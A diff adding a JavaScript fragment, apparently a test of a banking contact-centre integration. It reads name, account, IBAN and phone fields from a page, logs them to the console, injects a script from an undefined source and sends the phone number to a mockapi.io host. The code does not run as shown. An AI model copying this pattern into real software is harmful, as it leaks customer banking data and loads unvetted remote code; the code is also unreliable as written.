@@ -1,0 +1,36 @@
+
+var v_Name= "";
+var v_Account= "";
+var v_Iban= "";
+var v_customerPhone= "";
+
+function cx_getElement(id) {
+	var evalue = document.getElementById(id).value;
+	console.log(log_prefix + ' ' + evalue);
+	return evalue;
+}
+
+{
+    v_Name= cx_getElement("nome");
+    v_Account= cx_getElement("conto");
+    v_Iban= cx_getElement("iban");
+    v_customerPhone= cx_getElement("telefono");
+   
+   ys = document.createElement('script'); ys.async = 1; ys.src = n; ys.charset = 'utf-8'; document.head.appendChild(ys);
+   
+    let data;
+    let url = 'https://6724f040c39fedae05b35190.mockapi.io/api/AnnaG/TestUBS/?ani=' + v_customerPhone;
+    const res = await fetch(url);
+    if (res.ok) {
+       data = await res.json();
+      console.log(data);
+    }
+   const response = {
+        statusCode: 200,
+        body: JSON.stringify(data),
+    };
+    return response;
+};
+    
+
+
